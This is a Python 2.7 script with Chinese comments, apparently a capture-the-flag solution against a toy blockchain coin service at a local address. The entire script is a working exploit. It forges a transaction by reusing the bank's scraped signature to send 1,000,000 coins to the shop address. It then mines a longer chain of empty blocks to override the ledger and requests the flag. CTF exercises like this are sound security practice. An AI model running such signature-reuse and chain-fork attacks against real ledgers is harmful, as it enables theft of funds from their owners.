# -*- encoding: utf-8 -*-
# written in python 2.7
import hashlib, json, rsa, uuid, os,requests,re

# 一堆变量常量

url_root="http://127.0.0.1:8004/"
url_create="http://127.0.0.1:8004/create_transaction"
url_flag="http://127.0.0.1:8004/flag"

s=requests.Session()
ddcoin = s.get(url=url_root)

prev_one=re.search(r"hash of genesis block: ([0-9a-f]{64})",ddcoin.content, flags=0).group(1)
bank_utox_id=re.search(r"\"input\": \[\"([0-9a-f\-]{36})",ddcoin.content, flags=0).group(1)
bank_signature=re.search(r"\"signature\": \[\"([0-9a-f]{96})",ddcoin.content, flags=0).group(1)

DIFFICULTY = int('00000' + 'f' * 59, 16)
EMPTY_HASH = '0'*64

bank_addr="8035b93fe9a77c9980187fe960c25c58b155e89197aff81397ffbf9839f8bd6230dcda2ce676196c52eb7d4db99b643d"
hacke_addr="8603657fab78f286cea3b21f03d4ba8533378eedbb3b9dcb44e92966e0a9ab73cd1e775908aa1d23c01e8286d6af84ed"
shop_addr="ab8fa2dbba011081385750c88cba4085d19d793a2a5b485366269378a3eeef9621fb792665b3a527bcde10b50bb8e567"

# 源码中的API

def hash(x):
    return hashlib.sha256(hashlib.md5(x).digest()).hexdigest()

def hash_reducer(x, y):
    return hash(hash(x)+hash(y))

def hash_block(block):
    return reduce(hash_reducer, [block['prev'], block['nonce'], reduce(hash_reducer, [tx['hash'] for tx in block['transactions']], EMPTY_HASH)])

def hash_utxo(utxo):
    return reduce(hash_reducer, [utxo['id'], utxo['addr'], str(utxo['amount'])])

def hash_tx(tx):
    return reduce(hash_reducer, [
        reduce(hash_reducer, tx['input'], EMPTY_HASH),
        reduce(hash_reducer, [utxo['hash'] for utxo in tx['output']], EMPTY_HASH)
    ])

def create_output_utxo(addr_to, amount):
    utxo = {'id': str(uuid.uuid4()), 'addr': addr_to, 'amount': amount}
    utxo['hash'] = hash_utxo(utxo)
    return utxo

def create_tx(input_utxo_ids, output_utxo, privkey_from=None):
    tx = {'input': input_utxo_ids, 'signature':[bank_signature], 'output': output_utxo}  # 修改了签名
    tx['hash'] = hash_tx(tx)
    return tx

def create_block(prev_block_hash, nonce_str, transactions):
    if type(prev_block_hash) != type(''): raise Exception('prev_block_hash should be hex-encoded hash value')
    nonce = str(nonce_str)
    if len(nonce) > 128: raise Exception('the nonce is too long')
    block = {'prev': prev_block_hash, 'nonce': nonce, 'transactions': transactions}
    block['hash'] = hash_block(block)
    return block


# 构造的方法

def check_hash(prev,tx):
    for i in range(10000000):
        current_block=create_block(prev,str(i),tx)
        block_hash = int(current_block['hash'], 16)
        if block_hash<DIFFICULTY:
            print json.dumps(current_block)
            return current_block

def create_feak_one():
    utxo_first=create_output_utxo(shop_addr,1000000)
    tx_first=create_tx([bank_utox_id],[utxo_first])
    return check_hash(prev_one,[tx_first])

def create_empty_block(prev):
    return check_hash(prev,[])


# 攻击过程

a=create_feak_one()
print s.post(url=url_create,data=str(json.dumps(a))).content
b=create_empty_block(a['hash'])
print s.post(url=url_create,data=str(json.dumps(b))).content
c=create_empty_block(b['hash'])
print s.post(url=url_create,data=str(json.dumps(c))).content
d=create_empty_block(c['hash'])
print s.post(url=url_create,data=str(json.dumps(d))).content
e=create_empty_block(d['hash'])
print s.post(url=url_create,data=str(json.dumps(e))).content
print s.get(url=url_flag).content
